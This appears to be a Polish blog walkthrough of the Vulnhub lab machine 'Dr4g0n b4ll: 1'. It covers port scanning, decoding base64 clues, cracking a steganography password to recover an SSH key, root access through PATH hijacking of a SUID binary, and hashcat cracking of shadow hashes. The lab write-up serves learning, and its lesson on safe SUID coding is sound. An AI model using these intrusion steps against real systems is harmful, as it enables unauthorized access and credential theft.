---
title: "Dr4g0n b4ll: 1"
excerpt: " "
comments: true
categories:
  - Hacking
tags:
  - Hacking
  - Vulnhub
header:
  overlay_image: /assets/images/pasek-hack.png
gallery1_2:
  - url: /assets/images/hacking/2021/07/01.jpg
    image_path: /assets/images/hacking/2021/07/01.jpg
  - url: /assets/images/hacking/2021/07/02.jpg
    image_path: /assets/images/hacking/2021/07/02.jpg
gallery3:
  - url: /assets/images/hacking/2021/07/03.png
    image_path: /assets/images/hacking/2021/07/03.png
gallery4:    
  - url: /assets/images/hacking/2021/07/04.png
    image_path: /assets/images/hacking/2021/07/04.png
gallery5:
  - url: /assets/images/hacking/2021/07/05.png
    image_path: /assets/images/hacking/2021/07/05.png
gallery6:
  - url: /assets/images/hacking/2021/07/06.png
    image_path: /assets/images/hacking/2021/07/06.png
---
# Wstp
Wydany w poowie stycznia 2021 [Dr4g0n b4ll: 1](https://www.vulnhub.com/entry/dr4g0n-b4ll-1,646/), jak to autorzy wspominaj, jest bardzo prost maszyn. Jednak w maju utknem na niej w poowie, poniewa偶 wczeniej nie miaem do czynienia ze stenografi. Jedna po zaliczeniu paru podatnych obraz贸w, troch wiedzy przybyo i spr贸bowaem jeszcze raz. Jak zwykle, 偶eby wszystko dziaao pod XCP-NG trzeba zmodyfikowa [Grub-a](https://kerszl.github.io/hacking/xcp-ng-i-vulnhub/). Co do poziomu obraz贸w, to prostota prostocie nier贸wna, ostatnio te偶 bawiem si maszyn [Hack Me Please: 1](https://www.vulnhub.com/entry/hack-me-please-1,731/), ale ona ju偶 dla mnie taka prosta nie bya. Przypominaa bardziej prawdziw sytuacj w jakiej firmie, ni偶 tak bajkow z zagadkami z film贸w o hakerach. W trudniejszym dla mnie [Hack Me Please: 1](https://www.vulnhub.com/entry/hack-me-please-1,731/) niestety posikowaem si [solucj](https://nepcodex.com/2021/08/hack-me-please-walkthrough-vulnhub/), kt贸r znalazem na necie. Jest to inny typ zadania, Zagadki nie s rozmieszczone celowo, ale trzeba szuka ludzkich bd贸w i w programie. Bardziej to przypomina prawdziwe amanie w wiecie rzeczywistym. Wracajc do Dragon Ball-a, to jest ciekawy trik na kocu, kt贸ry nieraz si wam mo偶e przyda, ale to na kocu. 
{: .text-justify}
## Zaczynamy
Jak zwykle skanujemy porty Nmap-em. Mo偶emy te偶 u偶y Nmap-a w Metasploicie. Ja wol u偶ywa Metasploita, bo potem mam wszystkie: ip, hasa, otwarte porty w jednym miejscu.
{: .text-justify}
```bash
msf6 exploit(multi/handler) > db_nmap -A -p- 172.16.1.113
...
msf6 exploit(multi/handler) > services
Services
========

host          port  proto  name  state  info
----          ----  -----  ----  -----  ----
172.16.1.113  22    tcp    ssh   open   OpenSSH 7.9p1 Debian 10+deb10u2 protocol 2.0
172.16.1.113  80    tcp    http  open   Apache httpd 2.4.38 (Debian)
```
Otwarte s tylko 2 porty: 22 i 80.
{: .text-justify}
## Analizujemy stron
Na Stronie WWW mamy zdjcia z anime Dragon Ball.
{: .text-justify}
{% include gallery id="gallery1_2"  %}
To tylko ozdoba. Prawdziwa przygoda zaczyna si w kodzie strony. Na samym dole jest zakodowany napis:
{: .text-justify}
{% include gallery id="gallery3"  %}
Po trzykrotnym rozkodowaniu mamy napis **DRAGON BALL**:
```bash
echo -n VWtaS1FsSXdPVTlKUlVwQ1ZFVjNQUT09 | base64 -d
echo -n UkZKQlIwOU9JRUpCVEV3PQ== | base64 -d
echo -n RFJBR09OIEJBTEw= | base64 -d
DRAGON BALL
```
Jednak do kodowania napis贸w w **BASE64** radz pisa **echo -n**. Komenda **echo NAPIS | base64** zakoduje string i dodatkowo znak nowej linii **0x0a**.
{: .text-justify}
{: .notice--info}
Skanowanie Gobusterem:
```bash
gobuster dir -u http://172.16.1.124 -w /usr/share/wordlists/dirb/common.txt
```
I mamy ciekaw rzecz w robots.txt:

http://172.16.1.124/robots.txt
{: .notice--info}
Ponownie rozkodowujemy:
```bash
echo -n eW91IGZpbmQgdGhlIGhpZGRlbiBkaXI=  | base64 -d
echo -n ZVc5MUlHWnBibVFnZEdobElHaHBaR1JsYmlCa2FYST0K  | base64 -d
echo -n eW91IGZpbmQgdGhlIGhpZGRlbiBkaXI=  | base64 -d
you find the hidden dir 
```
Dostajemy komunikat, 偶eby szuka ukryty katalog. Jest tutaj:
{: .text-justify}

http://172.16.1.113/DRAGON%20BALL/Vulnhub/
{: .text-justify}
{: .notice--info}
Poni偶ej zawarto:
{: .text-justify}
{% include gallery id="gallery4"  %}

Mo偶emy wej na stron, ale nic na niej nie zdziaamy, taka podpucha:
{: .text-justify}

http://172.16.1.113/DRAGON%20BALL/Vulnhub/login.html
{: .notice--info}
{% include gallery id="gallery6"  %}
Strona nie dziaa poprawnie, ale mamy login i jest ciekawy obrazek **aj.jpg**:
{: .text-justify}
## Czas si przyjrze obrazowi
{% include gallery id="gallery5"  %}
Rozkodujmy go:
{: .text-justify}
```bash
root@kali:/home/szikers/dr4g0n_b4ll# stegcracker aj.jpg
StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2021 - Luke Paris (Paradoxis)

StegCracker has been retired following the release of StegSeek, which
will blast through the rockyou.txt wordlist within 1.9 second as opposed
to StegCracker which takes ~5 hours.

StegSeek can be found at: https://github.com/RickdeJager/stegseek

No wordlist was specified, using default rockyou.txt wordlist.
Counting lines in wordlist..
Attacking file 'aj.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: love
Tried 451 passwords
Your file has been written to: aj.jpg.out
love
```
Podgldamy co to za plik:
{: .text-justify}
```console
root@kali:/home/szikers/dr4g0n_b4ll# file aj.jpg.out
aj.jpg.out: OpenSSH private key
```
Mamy klucz, wic mo偶emy si dosta do shella, spr贸bujmy z loginem **xmen**:
{: .text-justify}
```bash
ssh -i id_rsa xmen@172.16.1.113
```
## Ldujemy w Shellu
Dziaa.Mamy katalog **script**, ale poszukajmy plik贸w, kt贸re maj ustawiony bit **suid**. Mo偶e si znajdzie co interesujcego:
{: .text-justify}
```console
xmen@debian:~/script$ find / -perm -4000 2> /dev/null
/home/xmen/script/shell
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/umount
/usr/bin/su
/usr/bin/mount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
```
Godna uwagi jest zawarto w: **/home/xmen/script/shell**
```console
xmen@debian:~$ ls script/ -lah
total 32K
drwxr-xr-x 2 root root 4.0K Jan  4  2021 .
drwxr-xr-x 5 xmen xmen 4.0K Aug  9 07:17 ..
-rw-r--r-- 1 root root   75 Jan  4  2021 demo.c
-rwsr-xr-x 1 root root  17K Jan  4  2021 shell
```
W **demo.c** wida kr贸tki kod 藕r贸dowy. Program przechodzi na uprawnienia Root-a i uruchamia program **ps**:
{: .text-justify}
```c
#include<unistd.h>
void main()
{ setuid(0);
  setgid(0);
  system("ps");
}
```
Czyli dziaa to tak:
{: .text-justify}
```console
xmen@debian:~/script$ ./shell
   PID TTY          TIME CMD
  5013 pts/0    00:00:00 shell
  5014 pts/0    00:00:00 sh
  5015 pts/0    00:00:00 ps
xmen@debian:~/script$
```
W kodzie programu nie mamy podanej caej cie偶ki do **ps**, wic mo偶emy to wykorzysta. Stw贸rzmy program **ps** w katalogu domowym:
{: .text-justify}
```bash 
file=/home/xmen/ps; touch $file && echo '/bin/bash' > $file && chmod +x $file
```
A nastpnie wyedytujmy zmienn **PATH**, 偶eby na pocztku szukaa **ps** w naszym katalogu domowym:
{: .text-justify}
```bash
PATH="/home/xmen:$(echo $PATH)"
```
```console
xmen@debian:~/script$ echo $PATH
/home/xmen:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
xmen@debian:~/script$ ./shell
root@debian:~/script# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(xmen)
root@debian:~/script#
```
I to wanie jest przestroga, 偶eby bardzo uwa偶nie pisa pliki, je偶eli chcemy da dla nich uprawnienia **suid**. **Ps** przecie偶 jest niegro藕ny, ale mo偶na zakombinowa i zrobi, 偶eby by niebezpieczny.
{: .text-justify}
{: .notice--danger}
## Na koniec deser
Skoro mamy Root-a, to mo偶emy zama hasa u偶ytkownik贸w. Zobaczmy czy nam si uda:
{: .text-justify}
```powershell
c:\temp\hashcat611>hashcat.exe -O -a0 -m1800 dr4g0n_b4ll.hash rockyou.txt --show
$6$ryGtS7NFOo0fL3Bz$DgubBE9c3PT1jO/PwcZN6/L9ryVrSE5YrOFW.OAt61lTltdvpqXiUJAMowAteKrHr4Dzo9aC3mP2KTLvmgsBl1:ajs
$6$LE/lm1ySj7zuJI08$JgfeDLBfd.ANiXAsAnAterH5wvNXbSrexGNfD8hGbJJiObtkVcly.Y.iCjWAO.T7WnzvKeFjV09yL/KQ/6j.g/:mrxmen
$6$rGpU.19PmreHrE2a$RD.cGy7WmrdLMdQSDiclKK/iYz95W8OUhujLWtTHloFXS/sNLwrb12yGkDvpZ60u73pa2k8m5PxZhhEjGZa.x.:love
```
No i mamy 3 hasa, w tym Root-a. Co tu robi konsola windowsowa? Ano u偶ywam Hashcata na Windowsie, ze wzgldu na kart graficzn, kt贸ra bardzo przypiesza rozkodowywanie **hashy**.
{: .text-justify}
